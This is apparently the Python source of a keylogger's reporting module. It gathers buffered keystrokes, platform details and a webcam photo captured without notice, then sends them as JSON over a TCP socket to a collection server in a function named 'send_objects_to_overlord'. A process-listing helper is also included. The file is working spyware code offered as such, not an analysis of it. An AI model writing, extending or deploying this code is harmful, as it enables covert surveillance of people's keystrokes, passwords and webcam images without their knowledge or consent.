import socket
import json
import struct
from sys_platform import get_platform
import cv2
import base64
import psutil
import os

KEYLOGGER_DEBUG_KEY = 'KEYLOGGER_DEBUG_KEY'
server_address = ('localhost', 9696)

# TODO put in __init__ or make somewhere more accessible so can be shared
def conditional_print_debug(str):
    if os.getenv(KEYLOGGER_DEBUG_KEY, True):
        print("DEBUG: %s" % (str))

def send_payload_to_socket(payload):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(server_address)
        # Send the length of the message first in the socket in network-byte order
        payload = struct.pack('>I', len(payload)) + payload
        sock.sendall(payload)
        sock.close()
    except socket.error as serr:
        conditional_print_debug(serr)
    import sys
    sys.exit(0)

def send_objects_to_overlord(buffered_keys):
    keys = [key.__dict__ for key in buffered_keys]
    payload = {}
    payload['user'] = get_platform()
    payload['user']['image'] = get_image()
    # payload['user']['processes'] = get_running_processes()
    payload['keys'] = keys
    send_payload_to_socket(json.dumps(payload))

def get_image():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    retval, buffer = cv2.imencode('.jpg', frame)
    return base64.b64encode(buffer)

def get_running_user_processes():
    # TODO change to user processes
    running_processes = []
    for proc in psutil.process_iter():
        try:
            running_processes.append(proc.name())
            print proc.cmdline()
        except psutil.AccessDenied:
            print "Permission error or access denied on process"
